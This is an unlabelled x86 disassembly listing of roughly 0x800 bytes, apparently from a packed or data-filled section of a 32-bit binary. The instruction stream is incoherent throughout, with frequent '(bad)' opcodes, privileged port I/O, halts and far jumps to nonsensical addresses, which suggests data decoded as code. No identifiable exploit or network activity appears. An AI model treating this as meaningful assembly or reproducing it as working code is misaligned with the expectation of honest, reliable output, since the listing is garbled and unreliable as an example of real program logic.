  416d18:	mov    dh,0xa4
  416d1a:	mov    bl,0xda
  416d1c:	test   bl,dl
  416d1e:	cmp    eax,0x1f7fb94b
  416d23:	add    al,0x8b
  416d25:	add    ch,BYTE PTR [edx+0x1229cc58]
  416d2b:	mov    esp,DWORD PTR [ebx+0xe11541a]
  416d31:	adc    edi,DWORD PTR [ecx+ecx*4-0x1e]
  416d35:	or     bh,BYTE PTR [ebx-0x78]
  416d38:	mov    WORD PTR [edx-0x426d464c],?
  416d3e:	adc    DWORD PTR [ebx+0x1b6d2c3f],eax
  416d44:	out    0xe0,al
  416d46:	xchg   edi,eax
  416d47:	cmp    al,0x2b
  416d49:	mov    ds:0x361648f6,eax
  416d4e:	hlt    
  416d4f:	stos   BYTE PTR es:[edi],al
  416d50:	add    eax,0xdf1d6c31
  416d55:	aad    0x4b
  416d57:	aaa    
  416d58:	clc    
  416d59:	add    eax,0x59cefd11
  416d5e:	vpunpckhqdq ymm5,ymm4,YMMWORD PTR [esi-0x3e]
  416d63:	mov    edx,0xea553967
  416d68:	out    0x54,eax
  416d6a:	xchg   edi,eax
  416d6b:	ret    
  416d6c:	dec    ebp
  416d6d:	fstp   QWORD PTR [edi+edx*1]
  416d70:	add    al,0x28
  416d72:	jae    0x416dc9
  416d74:	cmp    BYTE PTR [ebx],bl
  416d76:	pop    es
  416d77:	inc    eax
  416d78:	pop    ss
  416d79:	(bad)  
  416d7a:	mov    WORD PTR [esi],cs
  416d7c:	ret    
  416d7d:	loope  0x416de7
  416d7f:	pop    esp
  416d80:	or     BYTE PTR [esi+0x5c],0x84
  416d84:	mov    WORD PTR [edi+0x123ea510],es
  416d8a:	gs loopne 0x416db4
  416d8d:	(bad)  
  416d8e:	stc    
  416d8f:	bound  ebx,QWORD PTR [eax-0x73d95943]
  416d95:	fcomi  st,st(5)
  416d97:	ds jns 0x416e12
  416d9a:	ror    ah,cl
  416d9c:	and    BYTE PTR [ebp+0x771269c],bh
  416da2:	out    dx,al
  416da3:	mov    ebp,0xe1386dae
  416da8:	mov    ?,edi
  416daa:	pop    eax
  416dab:	sbb    DWORD PTR [edx-0x528441f2],eax
  416db1:	scas   al,BYTE PTR es:[edi]
  416db2:	pusha  
  416db3:	(bad)  
  416db4:	pop    esi
  416db5:	fmul   st(7),st
  416db7:	adc    bh,BYTE PTR [ebp-0x7afee63e]
  416dbd:	sbb    al,0xdc
  416dbf:	ret    0xe911
  416dc2:	in     eax,dx
  416dc3:	fist   WORD PTR [ebx-0x471881d2]
  416dc9:	shl    BYTE PTR [edx-0xcfb99b8],1
  416dcf:	pop    eax
  416dd0:	pushf  
  416dd1:	mov    bh,0xe7
  416dd3:	sub    al,0x49
  416dd5:	mov    al,0x68
  416dd7:	test   esp,ebp
  416dd9:	mov    ?,WORD PTR [eax]
  416ddb:	cmp    al,0x61
  416ddd:	mov    esp,0x6d9f6827
  416de2:	adc    bh,BYTE PTR [ebp+0x55]
  416de5:	or     eax,0x1f9fb741
  416dea:	xlat   BYTE PTR ds:[ebx]
  416deb:	fsubr  DWORD PTR [eax+0x947ad75]
  416df1:	sub    al,0xb7
  416df3:	push   cs
  416df4:	mov    dh,0xf1
  416df6:	xor    bl,BYTE PTR [edx-0x393ef7eb]
  416dfc:	add    bl,bl
  416dfe:	outs   dx,DWORD PTR ds:[esi]
  416dff:	dec    esp
  416e00:	mov    ds:0xe30d6b7d,eax
  416e05:	ja     0x416e14
  416e07:	inc    ebx
  416e08:	jnp    0x416e74
  416e0a:	lods   al,BYTE PTR ds:[esi]
  416e0b:	nop
  416e0c:	(bad)  [esi-0x2efac552]
  416e12:	or     eax,0x24dcbb90
  416e17:	mov    ah,0xe0
  416e19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e1a:	lods   eax,DWORD PTR ds:[esi]
  416e1b:	xor    DWORD PTR [ecx*8-0x4116bb8d],esi
  416e22:	lock icebp 
  416e24:	ins    BYTE PTR es:[edi],dx
  416e25:	outs   dx,WORD PTR ds:[esi]
  416e27:	stc    
  416e28:	mov    al,BYTE PTR [edx-0x5ab6d890]
  416e2e:	adc    ebp,DWORD PTR [esp]
  416e31:	cmp    al,0x5a
  416e33:	in     al,0x7c
  416e35:	ins    BYTE PTR es:[edi],dx
  416e36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e37:	mov    dl,0xa9
  416e39:	sbb    eax,0x7bdc5fd
  416e3e:	pop    ebp
  416e3f:	dec    esp
  416e40:	hlt    
  416e41:	je     0x416e4c
  416e43:	and    DWORD PTR [edi+0x507c80d0],0x58
  416e4a:	mov    WORD PTR [ebx-0x3152b637],fs
  416e50:	das    
  416e51:	dec    edi
  416e52:	and    eax,DWORD PTR [ecx*1-0x4f6b97e4]
  416e59:	cmp    ch,BYTE PTR [eax]
  416e5b:	push   0xe109f90f
  416e60:	and    ecx,eax
  416e62:	inc    esi
  416e63:	fwait
  416e64:	ins    DWORD PTR es:[edi],dx
  416e65:	cmp    al,0xf6
  416e67:	ins    DWORD PTR es:[edi],dx
  416e68:	mov    ah,ah
  416e6a:	aaa    
  416e6b:	shl    BYTE PTR [ebx],cl
  416e6d:	dec    ecx
  416e6e:	in     al,dx
  416e6f:	bnd ret 
  416e71:	cld    
  416e72:	fldenv [edx-0xea6b158]
  416e78:	mov    ecx,0xc77fc332
  416e7d:	and    al,0x73
  416e7f:	push   eax
  416e80:	sub    eax,0x615331e0
  416e85:	jb     0x416e4b
  416e87:	sub    dl,BYTE PTR [edx-0x767beca8]
  416e8d:	loopne 0x416e85
  416e8f:	aad    0x71
  416e91:	dec    esi
  416e92:	sbb    cl,BYTE PTR [esi+0x74]
  416e95:	jnp    0x416ea4
  416e97:	add    BYTE PTR [ebx-0x5f048a34],cl
  416e9d:	sub    ch,BYTE PTR [edx-0x40]
  416ea0:	dec    bx
  416ea2:	pop    esi
  416ea3:	repnz sub eax,ecx
  416ea6:	mov    DWORD PTR [edx],0x45de327
  416eac:	ror    BYTE PTR [ebp+0x2f],1
  416eaf:	ins    DWORD PTR es:[edi],dx
  416eb0:	mov    bh,0xff
  416eb2:	sbb    al,0x38
  416eb4:	das    
  416eb5:	call   FWORD PTR [ecx-0x6e817e2f]
  416ebb:	dec    esp
  416ebc:	popf   
  416ebd:	int    0x84
  416ebf:	inc    ecx
  416ec0:	mov    DWORD PTR [ecx],edi
  416ec2:	dec    ecx
  416ec3:	retf   
  416ec4:	pop    es
  416ec5:	xor    ebx,DWORD PTR [ebp+0x7cd57b7c]
  416ecb:	ret    0xc273
  416ece:	iret   
  416ecf:	aad    0x39
  416ed1:	xchg   ebp,eax
  416ed2:	and    eax,0x2eb854ed
  416ed7:	sar    BYTE PTR [edx+0x6e9e1844],cl
  416edd:	icebp  
  416ede:	retf   0x6bb2
  416ee1:	sti    
  416ee2:	call   0xab3fab73
  416ee7:	daa    
  416ee8:	ret    
  416ee9:	(bad)  
  416eea:	sub    al,0x18
  416eec:	and    ebx,DWORD PTR [edx+0x12c9f40c]
  416ef2:	or     esp,edx
  416ef4:	jl     0x416eed
  416ef6:	inc    eax
  416ef7:	fs push esp
  416ef9:	jbe    0x416efb
  416efb:	adc    al,0x3
  416efd:	shl    BYTE PTR [ecx],1
  416eff:	xchg   esi,eax
  416f00:	gs push ds
  416f02:	mov    esp,0x2874df83
  416f07:	es and eax,0x2b05ed51
  416f0d:	or     BYTE PTR [esi+0x66],al
  416f10:	inc    edi
  416f11:	pop    ds
  416f12:	imul   ebp,DWORD PTR [ebp-0x72],0xffffff8a
  416f16:	add    al,0x1b
  416f18:	push   ebx
  416f19:	mov    al,ds:0x38621066
  416f1e:	pop    ecx
  416f1f:	dec    esi
  416f20:	sbb    BYTE PTR [ebx+0x7ca80d09],0x8c
  416f27:	cdq    
  416f28:	and    ch,bh
  416f2a:	cmpxchg DWORD PTR [esi+edi*4+0x16],ebp
  416f2f:	xor    eax,0x2a503cd5
  416f34:	cmp    eax,0xff040cd1
  416f39:	xchg   ebp,eax
  416f3a:	adc    ah,al
  416f3c:	mov    ds:0x3a60f196,al
  416f41:	dec    esp
  416f42:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  416f44:	adc    al,0x49
  416f46:	mov    edi,0xec5b55d
  416f4b:	add    eax,0x37911db
  416f50:	repz fidivr WORD PTR [ebx]
  416f53:	cmp    al,cl
  416f55:	cmp    DWORD PTR [ebp+0x7a],ecx
  416f58:	rcl    DWORD PTR [esi-0x33],1
  416f5b:	push   esi
  416f5c:	xchg   edx,eax
  416f5d:	pop    edi
  416f5e:	pop    ecx
  416f5f:	enter  0x7faa,0x65
  416f63:	and    edi,DWORD PTR [edi+0x7ea8d39]
  416f69:	sub    bl,0x70
  416f6c:	leave  
  416f6d:	or     esi,DWORD PTR [ecx-0x45]
  416f70:	jmp    0x6663:0x5089257b
  416f77:	add    BYTE PTR [eax+0x6],0x12
  416f7b:	ret    0x7612
  416f7e:	adc    ebp,esi
  416f80:	bound  eax,QWORD PTR [esi+0x4c7725e2]
  416f86:	xchg   ebx,eax
  416f87:	mov    al,BYTE PTR [ebx]
  416f89:	sbb    BYTE PTR ds:0xf9526b0,al
  416f8f:	iret   
  416f90:	js     0x416f7f
  416f92:	out    0x67,al
  416f94:	arpl   WORD PTR [esi+0x4b99a306],ax
  416f9a:	stc    
  416f9b:	fdiv   QWORD PTR [esi+0x9]
  416f9e:	pop    ebx
  416f9f:	(bad)  
  416fa1:	cwde   
  416fa2:	pop    ecx
  416fa3:	push   esi
  416fa4:	mov    ebp,0x3189f7dc
  416fa9:	cmp    eax,0xcc7c5b0c
  416fae:	add    eax,0xcf55e853
  416fb3:	icebp  
  416fb4:	mov    al,0xd1
  416fb6:	pop    ebp
  416fb7:	enter  0x81f5,0xa6
  416fbb:	jl     0x416feb
  416fbd:	dec    esp
  416fbe:	in     al,0x78
  416fc0:	push   cs
  416fc1:	gs mov ch,0xa9
  416fc4:	(bad)  
  416fc5:	out    0xc8,al
  416fc7:	popa   
  416fc8:	xor    bl,dl
  416fca:	loopne 0x416fe2
  416fcc:	mov    ecx,0xa702a19
  416fd1:	(bad)  
  416fd2:	xchg   ebx,eax
  416fd3:	icebp  
  416fd4:	pop    ebp
  416fd5:	sub    DWORD PTR [edx-0x5aec8d1a],0x9715f115
  416fdf:	aam    0xb3
  416fe1:	pop    ds
  416fe2:	pop    ebx
  416fe3:	adc    bl,BYTE PTR [esp+ebp*2]
  416fe6:	rol    BYTE PTR [esp+edi*2+0x13],cl
  416fea:	sub    BYTE PTR [ebx-0x75c69802],ch
  416ff0:	dec    eax
  416ff1:	loopne 0x417007
  416ff3:	pop    esi
  416ff4:	mov    BYTE PTR [edx-0x2646cef0],bh
  416ffa:	pop    ds
  416ffb:	clc    
  416ffc:	sbb    eax,0x4170c85c
  417001:	xor    ch,BYTE PTR [ebp+0x358d739c]
  417007:	push   esi
  417008:	inc    ecx
  417009:	les    esi,FWORD PTR [esi]
  41700b:	jge    0x417007
  41700d:	test   bl,ch
  41700f:	adc    eax,0x3a7bd218
  417014:	out    dx,al
  417015:	mov    ebx,0xb0eb9a3e
  41701a:	xlat   BYTE PTR ds:[ebx]
  41701b:	std    
  41701c:	aad    0xab
  41701e:	pop    edi
  41701f:	ret    
  417020:	mov    esp,0x76045aa
  417025:	rol    BYTE PTR [ebp-0x3894178f],cl
  41702b:	not    BYTE PTR [edi]
  41702d:	ds shl dl,1
  417030:	inc    esp
  417031:	(bad)  
  417032:	fcomp  QWORD PTR [ecx+0x29975679]
  417038:	dec    edi
  417039:	mov    cs:0x95e3b1f4,al
  41703f:	out    dx,eax
  417040:	push   cs
  417041:	sbb    esi,edx
  417043:	adc    dl,BYTE PTR [ecx-0x5800be78]
  417049:	mov    bh,0x20
  41704b:	sbb    BYTE PTR [ebp+0x44],ah
  41704e:	dec    ecx
  41704f:	icebp  
  417050:	adc    eax,0x746dc0eb
  417055:	data16 out dx,al
  417057:	push   ss
  417058:	mov    esi,0x8d6a7a09
  41705d:	shr    DWORD PTR [ebp-0x4f],0x4a
  417061:	and    dl,ch
  417063:	mov    DWORD PTR [eax+0x58],eax
  417066:	enter  0xda93,0x86
  41706a:	push   ecx
  41706b:	mov    ecx,0xa6cb4534
  417070:	mov    esi,0x716669ba
  417075:	mov    BYTE PTR [ebp+0x3ac71f2f],cl
  41707b:	leave  
  41707c:	xchg   BYTE PTR [ebx+esi*2],dl
  41707f:	cmp    bl,BYTE PTR [edi+0x1a]
  417082:	div    BYTE PTR ds:0x1eccb2ec
  417088:	or     eax,0x8cc6f21a
  41708d:	dec    eax
  41708e:	jge    0x4170f2
  417090:	int    0x72
  417092:	jns    0x417028
  417094:	dec    edi
  417095:	out    0x4d,al
  417097:	je     0x417063
  417099:	mov    edx,0xef115bc2
  41709e:	pusha  
  41709f:	scas   eax,DWORD PTR es:[edi]
  4170a0:	shr    BYTE PTR [eax-0x58],1
  4170a3:	cmp    al,0xe4
  4170a5:	mov    bl,0x4f
  4170a7:	jno    0x4170e0
  4170a9:	xchg   ebp,eax
  4170aa:	inc    edi
  4170ab:	ret    0x7dd8
  4170ae:	xor    al,0x4f
  4170b0:	int3   
  4170b1:	shl    DWORD PTR [edi-0x1a],cl
  4170b4:	xor    ebp,DWORD PTR [ecx-0x4]
  4170b7:	jno    0x4170ce
  4170b9:	gs jmp 0x417095
  4170bc:	test   BYTE PTR gs:[ecx],0x7b
  4170c0:	jne    0x41707a
  4170c2:	fmul   DWORD PTR [ebx]
  4170c4:	mov    dl,0xe2
  4170c6:	sahf   
  4170c7:	xor    esi,ecx
  4170c9:	outs   dx,BYTE PTR ds:[esi]
  4170ca:	xchg   edx,eax
  4170cb:	popa   
  4170cc:	push   0x7deef490
  4170d1:	aad    0x6
  4170d3:	or     dl,dl
  4170d5:	outs   dx,BYTE PTR ds:[esi]
  4170d6:	std    
  4170d7:	or     al,0x1d
  4170d9:	dec    ecx
  4170da:	xchg   esi,eax
  4170db:	push   0x5a87fec6
  4170e0:	sbb    esp,DWORD PTR [ebx+0x70af856c]
  4170e6:	mov    edx,0xbdf5b3
  4170eb:	sbb    DWORD PTR [ebx+0x66],0x1fe64db8
  4170f2:	push   ecx
  4170f3:	or     esp,DWORD PTR [ebp+0x2fa8271d]
  4170f9:	mov    eax,0xfe8cc43c
  4170fe:	jmp    0xcf382979
  417103:	jne    0x4170a7
  417105:	push   cs
  417106:	outs   dx,BYTE PTR ds:[esi]
  417107:	sub    dh,BYTE PTR [ecx]
  417109:	popa   
  41710a:	jb     0x417183
  41710c:	cmp    DWORD PTR ss:[edx],0xffffffe2
  417110:	mov    ds:0x5431341e,al
  417115:	or     dl,BYTE PTR [esp+ecx*4+0x4177e524]
  41711c:	cmp    al,ah
  41711e:	mov    ebx,es
  417120:	mul    DWORD PTR [esi-0x3cfd8ca4]
  417126:	ret    
  417127:	sbb    DWORD PTR [ecx+0x56],0xffffffcb
  41712b:	mov    bh,0x45
  41712d:	ins    DWORD PTR es:[edi],dx
  41712e:	dec    esi
  41712f:	sbb    DWORD PTR [edx+0x603190e],edx
  417135:	push   es
  417136:	or     al,0x3c
  417138:	rcl    edi,1
  41713a:	inc    edx
  41713b:	and    DWORD PTR [edi-0xe6b8abc],ebx
  417141:	or     BYTE PTR [ebx],al
  417143:	imul   eax,ebx,0xfffffffd
  417146:	not    BYTE PTR [eax+0x46]
  417149:	add    al,0xaa
  41714b:	jnp    0x41711f
  41714d:	jmp    0xcf5a:0xa510281b
  417154:	test   BYTE PTR [ebp+0x57],ah
  417157:	jnp    0x41719d
  417159:	or     DWORD PTR [eiz*2+0x62659015],eax
  417160:	xchg   edi,eax
  417161:	ficomp WORD PTR [ebx]
  417163:	dec    eax
  417164:	xlat   BYTE PTR ds:[ebx]
  417165:	je     0x4171b4
  417167:	xchg   edx,eax
  417168:	repz sub esi,0xffffff9b
  41716c:	leave  
  41716d:	xchg   edi,eax
  41716e:	fs jp  0x4171d5
  417171:	stos   BYTE PTR es:[edi],al
  417172:	sub    esi,DWORD PTR [esi]
  417174:	push   esp
  417175:	repnz mov esp,0x709e80c5
  41717b:	sbb    DWORD PTR [ebp-0x311e8a19],0xffffff90
  417182:	das    
  417183:	aad    0x29
  417185:	or     esp,DWORD PTR ds:0x3703f073
  41718b:	dec    edi
  41718c:	add    eax,0xf06b3393
  417191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417192:	mov    edi,DWORD PTR [esi]
  417194:	and    al,0x22
  417196:	fst    DWORD PTR [eax]
  417198:	sbb    DWORD PTR [eax+0x3666dfe2],edx
  41719e:	fwait
  41719f:	bswap  edi
  4171a1:	adc    ebp,DWORD PTR [ecx+0x3d]
  4171a4:	sti    
  4171a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171a6:	pop    es
  4171a7:	pop    edx
  4171a8:	mov    eax,0x9ce85f98
  4171ad:	xor    al,0x17
  4171af:	pop    esi
  4171b0:	pop    eax
  4171b1:	(bad)  [esi+0x3fb540e8]
  4171b7:	and    ch,ah
  4171b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171ba:	inc    ecx
  4171bb:	sbb    ebp,DWORD PTR [esi]
  4171bd:	sahf   
  4171be:	inc    ebp
  4171bf:	fsubr  DWORD PTR [eax-0x1af69138]
  4171c5:	push   ebp
  4171c6:	cli    
  4171c7:	hlt    
  4171c8:	xor    eax,0xdcd786d7
  4171cd:	outs   dx,DWORD PTR ds:[esi]
  4171ce:	and    BYTE PTR [esi-0x10],bh
  4171d1:	bound  ecx,QWORD PTR [ebx-0x52c4285d]
  4171d7:	imul   BYTE PTR [edi+0x7f]
  4171da:	shl    ecx,0xf4
  4171dd:	dec    ecx
  4171de:	mov    ebx,0x5c915b4a
  4171e3:	ret    
  4171e4:	aad    0xba
  4171e6:	xchg   BYTE PTR [edi+0x31a219c3],bl
  4171ec:	fs in  eax,0x1
  4171ef:	stos   BYTE PTR es:[edi],al
  4171f0:	sub    BYTE PTR [ecx*2+0x7749b953],ch
  4171f7:	ret    
  4171f8:	retf   0xbe7c
  4171fb:	sub    DWORD PTR [ecx],0x6cb2eb3a
  417201:	and    al,0x71
  417203:	cwde   
  417204:	cmp    BYTE PTR [edi-0xad9a09d],bl
  41720a:	loopne 0x4171ff
  41720c:	pop    ss
  41720d:	mov    dh,0x9e
  41720f:	loope  0x4171bf
  417211:	pop    esi
  417212:	pushf  
  417213:	and    eax,0x19f0c574
  417218:	mov    al,0xee
  41721a:	sub    ebp,0x42
  41721d:	xchg   edi,eax
  41721e:	mov    ah,bh
  417220:	or     eax,0xfc43d6d1
  417225:	iret   
  417226:	mov    BYTE PTR [eax-0x102f064],bl
  41722c:	mov    bl,0x8b
  41722e:	stos   BYTE PTR es:[edi],al
  41722f:	into   
  417230:	cmp    BYTE PTR [esi+0x180bed3e],dh
  417236:	jle    0x417284
  417238:	ins    DWORD PTR es:[edi],dx
  417239:	outs   dx,DWORD PTR ds:[esi]
  41723a:	or     BYTE PTR [eax+0x57293e16],bh
  417240:	add    eax,0xe0eb75ea
  417245:	sbb    DWORD PTR [ebx-0x51676c2c],0x19
  41724c:	ins    DWORD PTR es:[edi],dx
  41724d:	jbe    0x41724b
  41724f:	mov    cl,0x52
  417251:	add    al,0xf2
  417253:	cmp    al,0x8e
  417255:	or     eax,0xf958f0e1
  41725a:	cmp    dh,BYTE PTR [ebx+0xf3f1c06]
  417260:	fiadd  DWORD PTR [edi+0x67]
  417263:	not    DWORD PTR [ebp-0x2a4f0543]
  417269:	or     DWORD PTR [esi+0x49],edx
  41726c:	aaa    
  41726d:	or     DWORD PTR [eax],eax
  41726f:	push   es
  417270:	cwde   
  417271:	xchg   ecx,eax
  417272:	jg     0x41723c
  417274:	jg     0x417232
  417276:	test   eax,0xbf1300df
  41727b:	add    ebp,DWORD PTR [edx-0x14f6fd68]
  417281:	ins    BYTE PTR es:[edi],dx
  417282:	inc    esi
  417283:	sar    DWORD PTR [edx+0x5f8c1480],cl
  417289:	jge    0x417211
  41728b:	and    al,BYTE PTR [ebp+0x1c]
  41728e:	shl    edi,1
  417290:	int    0xd6
  417292:	sub    al,0x65
  417294:	imul   ebx,DWORD PTR [ecx],0x954836f6
  41729a:	xor    al,0x73
  41729c:	repnz xor eax,0x61171a66
  4172a2:	and    al,0x8c
  4172a4:	xchg   ebp,eax
  4172a5:	mov    al,ds:0x761cea0a
  4172aa:	fstp   QWORD PTR [ebx]
  4172ac:	xor    eax,0xaa220beb
  4172b1:	icebp  
  4172b2:	data16 and ah,BYTE PTR [esi+0x0]
  4172b6:	sub    BYTE PTR fs:[esi+0x21],dl
  4172ba:	mov    dl,0x56
  4172bc:	lods   al,BYTE PTR ds:[esi]
  4172bd:	and    DWORD PTR [edx-0x19],esi
  4172c0:	cmp    ecx,0xffffff8c
  4172c3:	and    esp,DWORD PTR [edi-0x9]
  4172c6:	or     edi,DWORD PTR [ebp+0x20]
  4172c9:	aad    0xe6
  4172cb:	cli    
  4172cc:	mov    al,ds:0x57970ac8
  4172d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172d2:	or     DWORD PTR ds:0xa40d32e7,esi
  4172d8:	push   es
  4172d9:	cmp    BYTE PTR [edi+0x4831646a],ch
  4172df:	and    al,0x98
  4172e1:	mov    ah,0xb6
  4172e3:	xchg   ebx,eax
  4172e4:	(bad)
  4172e7:	outs   dx,BYTE PTR ds:[esi]
  4172e8:	stos   DWORD PTR es:[edi],eax
  4172e9:	bound  edx,QWORD PTR [edx+0x37]
  4172ec:	add    esp,esp
  4172ee:	push   eax
  4172ef:	ror    BYTE PTR [edi-0x6e],1
  4172f2:	leave  
  4172f3:	ins    DWORD PTR es:[edi],dx
  4172f4:	mov    al,ah
  4172f6:	(bad)  
  4172f7:	and    al,0x45
  4172f9:	sahf   
  4172fa:	mov    bl,0xd0
  4172fc:	mov    ds,WORD PTR [ecx+0x6a91f502]
  417302:	ret    0xa461
  417305:	jbe    0x4172b8
  417307:	lods   eax,DWORD PTR ds:[esi]
  417308:	inc    edx
  417309:	call   0x3dda5a6d
  41730e:	mov    edi,edx
  417310:	sbb    DWORD PTR [ebp+edx*1+0x5],ecx
  417314:	ret    0x6c45
  417317:	in     eax,0x26
  417319:	mov    eax,ds:0x93df182a
  41731e:	add    eax,DWORD PTR [edx]
  417320:	enter  0x8c4e,0xa0
  417324:	inc    ebp
  417325:	popf   
  417326:	rcl    dh,0x14
  417329:	lods   eax,DWORD PTR ds:[esi]
  41732a:	jmp    0xe71b420d
  41732f:	mov    esi,0xb4b5580f
  417334:	test   BYTE PTR [ebx],0xe2
  417337:	cmp    eax,0x4812840a
  41733c:	stc    
  41733d:	icebp  
  41733e:	cmp    ch,dh
  417340:	fdiv   DWORD PTR [eax+0x741c9598]
  417346:	push   ds
  417347:	cmp    BYTE PTR [ebp+ebx*8+0xda740a6],0xac
  41734f:	call   0x935f4e2e
  417354:	daa    
  417355:	je     0x4173be
  417357:	jecxz  0x4172e7
  417359:	gs xchg ebx,eax
  41735b:	sub    eax,0xe157cd7a
  417360:	xor    ch,BYTE PTR [ebx-0x7b]
  417363:	jae    0x4172ff
  417365:	cmp    BYTE PTR [edi],dh
  417367:	loope  0x41738e
  417369:	out    dx,eax
  41736a:	shl    BYTE PTR [edx+edx*1],0xb7
  41736e:	pop    es
  41736f:	cs mov ecx,0xcb568a88
  417375:	int3   
  417376:	mov    ebx,0x9d673247
  41737b:	out    dx,al
  41737c:	aas    
  41737d:	fwait
  41737e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41737f:	xchg   edi,eax
  417380:	cmp    esp,DWORD PTR [edi+edx*4+0x79]
  417384:	je     0x417396
  417386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417387:	xchg   edx,eax
  417388:	fdiv   DWORD PTR [ecx+0x68905efd]
  41738e:	sub    edx,ebp
  417390:	mov    cl,0xe8
  417392:	adc    al,0x86
  417394:	inc    ebp
  417395:	xchg   ebx,eax
  417396:	repnz not cl
  417399:	mov    ah,al
  41739b:	push   edi
  41739c:	xor    BYTE PTR [edi-0xb420388],bh
  4173a2:	cs mov eax,0xa22d26e1
  4173a8:	sbb    esp,eax
  4173aa:	pushf  
  4173ab:	aas    
  4173ac:	add    bl,bl
  4173ae:	test   DWORD PTR fs:[esi-0xd8f6ae1],0xef0e8623
  4173b9:	popf   
  4173ba:	adc    edx,esi
  4173bc:	retf   
  4173bd:	adc    DWORD PTR [esi-0x17],esp
  4173c0:	xchg   esp,eax
  4173c1:	dec    edi
  4173c2:	shl    DWORD PTR [eax+0x400afe97],cl
  4173c8:	sub    ebp,DWORD PTR [ebx]
  4173ca:	push   ebp
  4173cb:	jmp    0x2833:0x10f553ec
  4173d2:	repnz popf 
  4173d4:	bound  ecx,QWORD PTR [edx+0x3402acd3]
  4173da:	stos   DWORD PTR es:[edi],eax
  4173db:	ss iret 
  4173dd:	inc    esi
  4173de:	rol    ah,0xd3
  4173e1:	jbe    0x4173ea
  4173e3:	scas   eax,DWORD PTR es:[edi]
  4173e4:	pop    edi
  4173e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173e6:	xchg   esp,eax
  4173e7:	push   esi
  4173e8:	clc    
  4173e9:	inc    ebp
  4173ea:	mul    DWORD PTR [esi]
  4173ec:	shl    BYTE PTR [ebx+0x11],cl
  4173ef:	mov    esi,0x85655bd9
  4173f4:	mov    edi,0x72b0cf97
  4173f9:	call   0x73687322
  4173fe:	(bad)  
  4173ff:	std    
  417400:	cld    
  417401:	into   
  417402:	mov    dl,0xdd
  417404:	cmp    dl,bh
  417406:	aam    0x20
  417408:	or     bl,BYTE PTR [ebx+0x671b9daa]
  41740e:	sti    
  41740f:	xchg   edx,eax
  417410:	dec    eax
  417411:	mov    edi,0x6b8027c
  417416:	popa   
  417417:	dec    esp
  417418:	ret    0x7150
  41741b:	dec    edx
  41741c:	adc    al,0xc9
  41741e:	clc    
  41741f:	inc    esi
  417420:	xchg   ebp,eax
  417421:	ss int3 
  417423:	dec    ecx
  417424:	jge    0x4173e8
  417426:	loope  0x417416
  417428:	sbb    esp,esi
  41742a:	cmp    al,0x99
  41742c:	xlat   BYTE PTR ds:[ebx]
  41742d:	mov    bl,bl
  41742f:	mov    ds:0x9a4209d9,eax
  417434:	outs   dx,DWORD PTR ds:[esi]
  417435:	sti    
  417436:	mov    cl,0x31
  417438:	in     eax,dx
  417439:	add    esi,DWORD PTR [edx]
  41743b:	jo     0x41748c
  41743d:	push   ss
  41743e:	test   eax,0xa6a2935a
  417443:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417444:	ds adc eax,0x8c18f2ca
  41744a:	addr16 xor al,0x23
  41744d:	pushf  
  41744e:	ret    
  41744f:	mov    DWORD PTR [esi],esp
  417451:	out    dx,eax
  417452:	outs   dx,DWORD PTR ds:[esi]
  417453:	dec    edx
  417454:	sbb    ebx,DWORD PTR [esi+0x3b]
  417457:	pusha  
  417458:	cmovnp ebx,DWORD PTR [ebx]
  41745b:	mov    ch,0x76
  41745d:	daa    
  41745e:	pop    ds
  41745f:	cs adc al,0x19
  417462:	mov    esp,0x50bfa028
  417467:	push   ds
  417468:	or     edx,DWORD PTR [esi]
  41746a:	lods   al,BYTE PTR ds:[esi]
  41746b:	jno    0x4174e1
  41746d:	repz aad 0xbe
  417470:	popf   
  417471:	jo     0x417453
  417473:	mov    al,0x4
  417475:	dec    edi
  417476:	adc    edi,DWORD PTR [edi+eax*1]
  417479:	xchg   edi,eax
  41747a:	and    DWORD PTR [esi+0x27],0x1c
  41747e:	dec    eax
  41747f:	jl     0x4174ee
  417481:	push   esi
  417482:	aaa    
  417483:	dec    edx
  417484:	or     al,0x9f
  417486:	stc    
  417487:	push   ebp
  417488:	ror    DWORD PTR [eax+0x2e],0x64
  41748c:	push   esp
  41748d:	mov    DWORD PTR [ebp-0x47d23f6b],eax
  417493:	cmp    eax,0x7c1e0e06
  417498:	(bad)  
  417499:	push   edi
  41749a:	pop    edi
  41749b:	int3   
  41749c:	sub    BYTE PTR [ebp+edx*4-0xa592629],dh
  4174a3:	pop    ebx
  4174a4:	not    cl
  4174a6:	adc    al,0xeb
  4174a8:	pop    ebx
  4174a9:	pop    ebx
  4174aa:	mov    ch,0xe6
  4174ac:	fsubr  QWORD PTR ds:[esi+ebp*2-0x53]
  4174b1:	and    eax,0x1bec7724
  4174b6:	les    ecx,FWORD PTR [esi]
  4174b8:	aad    0xd4
  4174ba:	dec    esi
  4174bb:	call   0xa7b2de18
  4174c0:	fsub   QWORD PTR [eax+0x70]
  4174c3:	aam    0x89
  4174c5:	loopne 0x4174b2
  4174c7:	xor    DWORD PTR [ecx+0x37285f1],eax
  4174cd:	push   eax
  4174ce:	sub    ecx,ebp
  4174d0:	cwde   
  4174d1:	imul   ecx,DWORD PTR [ebp+0x2c9c836c],0x7
  4174d8:	sub    dl,BYTE PTR [eax+ebp*1]
  4174db:	adc    dh,bl
  4174dd:	lods   al,BYTE PTR ds:[esi]
  4174de:	xchg   edi,eax
  4174df:	xlat   BYTE PTR ds:[ebx]
  4174e0:	or     edx,DWORD PTR [ebp+0x340b38fe]
  4174e6:	dec    esi
  4174e7:	push   ss
  4174e8:	mov    edx,DWORD PTR [ebx+0x2a]
  4174eb:	mov    dh,0x5d
  4174ed:	shl    BYTE PTR [ebx+0x228765f3],0xb2
  4174f4:	or     ch,bh
  4174f6:	xor    al,0x13
  4174f8:	mov    ebp,0xa4bfb503
  4174fd:	scas   al,BYTE PTR es:[edi]
  4174fe:	dec    eax
  4174ff:	adc    eax,0x3cf66246
  417504:	mov    DWORD PTR [edi],esi
  417506:	cmc    
